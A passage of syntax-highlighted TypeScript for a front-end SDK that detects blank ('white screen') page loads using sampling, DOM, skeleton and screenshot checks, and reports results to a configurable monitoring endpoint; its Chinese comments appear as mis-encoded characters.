    <span class="hljs-comment">// é¡µé¢å¸è½½æ—¶å‘é€é˜Ÿåˆ—ä¸­çš„æ•°æ®</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>();
    });
    
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'pagehide'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>();
    });
  }
  
  <span class="hljs-comment">/**
   * ä¸ŠæŠ¥æ•°æ®
   */</span>
  <span class="hljs-title function_">report</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">WhiteScreenReport</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// é‡‡æ ·</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">sampleRate</span>) {
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// æ§åˆ¶å°è¾“å‡º</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableConsole</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">logToConsole</span>(data);
    }
    
    <span class="hljs-comment">// åŠ å…¥é˜Ÿåˆ—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">push</span>(data);
    
    <span class="hljs-comment">// é˜Ÿåˆ—æ»¡äº†å°±å‘é€</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxQueueSize</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>();
    }
    
    <span class="hljs-comment">// ä¹Ÿå¯ä»¥ç«‹å³å‘é€ï¼ˆé’ˆå¯¹ç™½å±è¿™ç§é‡è¦äº‹ä»¶ï¼‰</span>
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">isWhiteScreen</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>();
    }
  }
  
  <span class="hljs-comment">/**
   * å‘é€é˜Ÿåˆ—ä¸­çš„æ•°æ®
   */</span>
  <span class="hljs-title function_">flush</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isFlushing</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isFlushing</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">const</span> dataToSend = [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span> = [];
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">endpoint</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendData</span>(dataToSend);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isFlushing</span> = <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">/**
   * å‘é€æ•°æ®
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">sendData</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">WhiteScreenReport</span>[]): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">const</span> payload = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data);
    
    <span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨ Beacon API</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableBeacon</span> &amp;&amp; navigator.<span class="hljs-property">sendBeacon</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([payload], { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/json'</span> });
        <span class="hljs-keyword">const</span> success = navigator.<span class="hljs-title function_">sendBeacon</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">endpoint</span>!, blob);
        <span class="hljs-keyword">if</span> (success) <span class="hljs-keyword">return</span>;
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// Beacon å¤±è´¥ï¼Œé™çº§åˆ° fetch</span>
      }
    }
    
    <span class="hljs-comment">// é™çº§ä½¿ç”¨ fetch</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendWithFetch</span>(payload);
  }
  
  <span class="hljs-comment">/**
   * ä½¿ç”¨ fetch å‘é€
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">sendWithFetch</span>(<span class="hljs-attr">payload</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">endpoint</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">const</span> <span class="hljs-attr">headers</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">customHeaders</span>
    };
    
    <span class="hljs-title function_">fetch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">endpoint</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      headers,
      <span class="hljs-attr">body</span>: payload,
      <span class="hljs-attr">keepalive</span>: <span class="hljs-literal">true</span>
    }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// é™é»˜å¤±è´¥</span>
    });
  }
  
  <span class="hljs-comment">/**
   * æ§åˆ¶å°è¾“å‡º
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">logToConsole</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">WhiteScreenReport</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">const</span> prefix = <span class="hljs-string">'[WhiteScreen]'</span>;
    
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">isWhiteScreen</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(
        <span class="hljs-string">`<span class="hljs-subst">${prefix}</span> æ£€æµ‹åˆ°ç™½å±ï¼`</span>,
        <span class="hljs-string">'\næ–¹æ³•:'</span>, data.<span class="hljs-property">detectionMethod</span>,
        <span class="hljs-string">'\nURL:'</span>, data.<span class="hljs-property">url</span>,
        <span class="hljs-string">'\næ—¶é—´:'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(data.<span class="hljs-property">timestamp</span>).<span class="hljs-title function_">toISOString</span>(),
        <span class="hljs-string">'\nè¯¦æƒ…:'</span>, data
      );
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
        <span class="hljs-string">`<span class="hljs-subst">${prefix}</span> é¡µé¢æ­£å¸¸`</span>,
        <span class="hljs-string">'\næ–¹æ³•:'</span>, data.<span class="hljs-property">detectionMethod</span>,
        <span class="hljs-string">'\nè€—æ—¶:'</span>, <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - data.<span class="hljs-property">timestamp</span>, <span class="hljs-string">'ms'</span>
      );
    }
  }
  
  <span class="hljs-comment">/**
   * è®¾ç½®ä¸ŠæŠ¥ç«¯ç‚¹
   */</span>
  <span class="hljs-title function_">setEndpoint</span>(<span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">endpoint</span> = endpoint;
  }
  
  <span class="hljs-comment">/**
   * è®¾ç½®é‡‡æ ·ç‡
   */</span>
  <span class="hljs-title function_">setSampleRate</span>(<span class="hljs-attr">rate</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">sampleRate</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>, rate));
  }
}

<span class="hljs-comment">// ==================== ä¸» SDK ç±» ====================</span>

<span class="hljs-comment">/**
 * ç™½å±æ£€æµ‹ SDK ä¸»ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WhiteScreenSDK</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>&gt;;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">samplingDetector</span>: <span class="hljs-title class_">SamplingDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">domDetector</span>: <span class="hljs-title class_">DOMDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">mutationDetector</span>: <span class="hljs-title class_">MutationDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">screenshotDetector</span>: <span class="hljs-title class_">ScreenshotDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">skeletonDetector</span>: <span class="hljs-title class_">SkeletonDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">performanceDetector</span>: <span class="hljs-title class_">PerformanceDetector</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">errorMonitor</span>: <span class="hljs-title class_">ErrorMonitor</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">reporter</span>: <span class="hljs-title class_">Reporter</span>;
  
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isInitialized</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isDetecting</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">detectionCount</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">lastDetectionTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-comment">// é»˜è®¤é…ç½®</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">defaultConfig</span>: <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>&gt; = {
    <span class="hljs-attr">samplingPoints</span>: <span class="hljs-number">17</span>,
    <span class="hljs-attr">delay</span>: <span class="hljs-number">1000</span>,
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,
    <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.95</span>,
    <span class="hljs-attr">enableDOMDetection</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enableSamplingDetection</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enableMutationDetection</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enableScreenshotDetection</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">enableSkeletonDetection</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">skeletonSelector</span>: <span class="hljs-string">'.skeleton, [data-skeleton], .loading-skeleton'</span>,
    <span class="hljs-attr">keyElementSelectors</span>: [<span class="hljs-string">'#app'</span>, <span class="hljs-string">'#root'</span>, <span class="hljs-string">'.app'</span>, <span class="hljs-string">'main'</span>],
    <span class="hljs-attr">ignoreSelectors</span>: [<span class="hljs-string">'script'</span>, <span class="hljs-string">'style'</span>, <span class="hljs-string">'link'</span>, <span class="hljs-string">'meta'</span>],
    <span class="hljs-attr">container</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onReport</span>: <span class="hljs-function">() =&gt;</span> {},
    <span class="hljs-attr">onDetectionComplete</span>: <span class="hljs-function">() =&gt;</span> {},
    <span class="hljs-attr">enableInDev</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">maxRetries</span>: <span class="hljs-number">3</span>,
    <span class="hljs-attr">retryInterval</span>: <span class="hljs-number">1000</span>,
    <span class="hljs-attr">customDetector</span>: <span class="hljs-literal">undefined</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> () =&gt; <span class="hljs-built_in">boolean</span>
  };
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-comment">// åˆå¹¶é…ç½®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = <span class="hljs-title function_">deepMerge</span>(<span class="hljs-title class_">WhiteScreenSDK</span>.<span class="hljs-property">defaultConfig</span>, config);
    
    <span class="hljs-comment">// åˆå§‹åŒ–å„ä¸ªæ£€æµ‹å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">samplingDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SamplingDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">domDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutationDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">screenshotDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScreenshotDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">skeletonDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceDetector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceDetector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMonitor</span>();
    
    <span class="hljs-comment">// åˆå§‹åŒ–ä¸ŠæŠ¥å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">reporter</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reporter</span>({
      <span class="hljs-attr">enableConsole</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">enableBeacon</span>: <span class="hljs-literal">true</span>
    });
  }
  
  <span class="hljs-comment">/**
   * åˆå§‹åŒ– SDK
   */</span>
  <span class="hljs-title function_">init</span>(): <span class="hljs-title class_">WhiteScreenSDK</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isInitialized</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'[WhiteScreenSDK] Already initialized'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨å¼€å‘ç¯å¢ƒ</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableInDev</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDevelopment</span>()) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[WhiteScreenSDK] Disabled in development environment'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }
    
    <span class="hljs-comment">// å¼€å§‹é”™è¯¯ç›‘å¬</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span>.<span class="hljs-title function_">start</span>();
    
    <span class="hljs-comment">// åˆå§‹åŒ–æ€§èƒ½æ£€æµ‹å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceDetector</span>.<span class="hljs-title function_">initLCPObserver</span>();
    
    <span class="hljs-comment">// åœ¨é¡µé¢åŠ è½½å®Œæˆåå¼€å§‹æ£€æµ‹</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> === <span class="hljs-string">'complete'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scheduleDetection</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scheduleDetection</span>();
      });
    }
    
    <span class="hljs-comment">// ç›‘å¬é¡µé¢å¯è§æ€§å˜åŒ–</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'visibilitychange'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">'visible'</span> &amp;&amp; !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDetecting</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scheduleDetection</span>();
      }
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isInitialized</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[WhiteScreenSDK] Initialized'</span>);
    
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­æ˜¯å¦ä¸ºå¼€å‘ç¯å¢ƒ
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">isDevelopment</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">return</span> (
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hostname</span> === <span class="hljs-string">'localhost'</span> ||
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hostname</span> === <span class="hljs-string">'127.0.0.1'</span> ||
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hostname</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'.local'</span>) ||
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">port</span> !== <span class="hljs-string">''</span>
    );
  }
  
  <span class="hljs-comment">/**
   * è°ƒåº¦æ£€æµ‹
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">scheduleDetection</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">detect</span>();
    }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">delay</span>);
  }
  
  <span class="hljs-comment">/**
   * æ‰§è¡Œæ£€æµ‹
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">detect</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">DetectionResult</span>&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDetecting</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">confidence</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">methods</span>: [],
        <span class="hljs-attr">methodResults</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),
        <span class="hljs-attr">basis</span>: <span class="hljs-string">'Already detecting'</span>
      };
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDetecting</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">detectionCount</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastDetectionTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    
    <span class="hljs-keyword">const</span> methodResults = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">DetectionMethod</span>, <span class="hljs-built_in">boolean</span>&gt;();
    <span class="hljs-keyword">const</span> <span class="hljs-attr">usedMethods</span>: <span class="hljs-title class_">DetectionMethod</span>[] = [];
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// æ‰§è¡Œå„ç§æ£€æµ‹æ–¹æ³•</span>
      
      <span class="hljs-comment">// 1. é‡‡æ ·ç‚¹æ£€æµ‹</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableSamplingDetection</span>) {
        <span class="hljs-keyword">const</span> samplingResult = <span class="hljs-variable language_">this</span>.<span class="hljs-property">samplingDetector</span>.<span class="hljs-title function_">detect</span>();
        <span class="hljs-keyword">const</span> isWhite = <span class="hljs-variable language_">this</span>.<span class="hljs-property">samplingDetector</span>.<span class="hljs-title function_">isWhiteScreen</span>(samplingResult);
        methodResults.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SAMPLING</span>, isWhite);
        usedMethods.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SAMPLING</span>);
      }
      
      <span class="hljs-comment">// 2. DOM æ£€æµ‹</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableDOMDetection</span>) {
        <span class="hljs-keyword">const</span> domResult = <span class="hljs-variable language_">this</span>.<span class="hljs-property">domDetector</span>.<span class="hljs-title function_">detect</span>();
        <span class="hljs-keyword">const</span> isWhite = !domResult.<span class="hljs-property">passed</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">domDetector</span>.<span class="hljs-title function_">hasValidContent</span>();
        methodResults.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">DOM</span>, isWhite);
        usedMethods.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">DOM</span>);
      }
      
      <span class="hljs-comment">// 3. éª¨æ¶å±æ£€æµ‹</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableSkeletonDetection</span>) {
        <span class="hljs-keyword">const</span> skeletonResult = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">skeletonDetector</span>.<span class="hljs-title function_">detect</span>();
        <span class="hljs-keyword">const</span> isWhite = skeletonResult.<span class="hljs-property">skeletonExists</span> &amp;&amp; !skeletonResult.<span class="hljs-property">skeletonRemoved</span>;
        methodResults.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SKELETON</span>, isWhite);
        usedMethods.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SKELETON</span>);
      }
      
      <span class="hljs-comment">// 4. æˆªå›¾æ£€æµ‹ï¼ˆè¾ƒæ…¢ï¼Œå¯é€‰ï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">enableScreenshotDetection</span>) {
        <span class="hljs-keyword">const</span> screenshotResult = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">screenshotDetector</span>.<span class="hljs-title function_">detect</span>();
        methodResults.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SCREENSHOT</span>, screenshotResult.<span class="hljs-property">isWhiteScreen</span>);
        usedMethods.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SCREENSHOT</span>);
      }
      
      <span class="hljs-comment">// 5. è‡ªå®šä¹‰æ£€æµ‹å™¨</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">customDetector</span>) {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-keyword">const</span> customResult = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">customDetector</span>();
          methodResults.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">CUSTOM</span>, customResult);
          usedMethods.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">CUSTOM</span>);
        } <span class="hljs-keyword">catch</span> {
          <span class="hljs-comment">// è‡ªå®šä¹‰æ£€æµ‹å™¨å¤±è´¥</span>
        }
      }
      
      <span class="hljs-comment">// ç»¼åˆåˆ¤æ–­</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">combineResults</span>(methodResults, usedMethods);
      
      <span class="hljs-comment">// ç”ŸæˆæŠ¥å‘Š</span>
      <span class="hljs-keyword">const</span> report = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateReport</span>(result, methodResults);
      
      <span class="hljs-comment">// ä¸ŠæŠ¥</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reporter</span>.<span class="hljs-title function_">report</span>(report);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">onReport</span>(report);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">onDetectionComplete</span>(result);
      
      <span class="hljs-comment">// å¦‚æœæ£€æµ‹åˆ°ç™½å±ï¼Œå¯èƒ½éœ€è¦é‡è¯•</span>
      <span class="hljs-keyword">if</span> (result.<span class="hljs-property">isWhiteScreen</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">detectionCount</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">maxRetries</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDetecting</span> = <span class="hljs-literal">false</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">detect</span>();
        }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">retryInterval</span>);
      }
      
      <span class="hljs-keyword">return</span> result;
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'[WhiteScreenSDK] Detection error:'</span>, error);
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">confidence</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">methods</span>: usedMethods,
        methodResults,
        <span class="hljs-attr">basis</span>: <span class="hljs-string">`Error: <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> <span class="hljs-built_in">Error</span>).message}</span>`</span>
      };
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDetecting</span> = <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-comment">/**
   * ç»¼åˆå„æ–¹æ³•ç»“æœ
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">combineResults</span>(
    <span class="hljs-attr">methodResults</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">DetectionMethod</span>, <span class="hljs-built_in">boolean</span>&gt;,
    <span class="hljs-attr">usedMethods</span>: <span class="hljs-title class_">DetectionMethod</span>[]
  ): <span class="hljs-title class_">DetectionResult</span> {
    <span class="hljs-keyword">if</span> (usedMethods.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">confidence</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">methods</span>: [],
        methodResults,
        <span class="hljs-attr">basis</span>: <span class="hljs-string">'No detection methods enabled'</span>
      };
    }
    
    <span class="hljs-comment">// è®¡ç®—ç™½å±ç¥¨æ•°</span>
    <span class="hljs-keyword">let</span> whiteVotes = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> totalVotes = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// ä¸åŒæ–¹æ³•çš„æƒé‡</span>
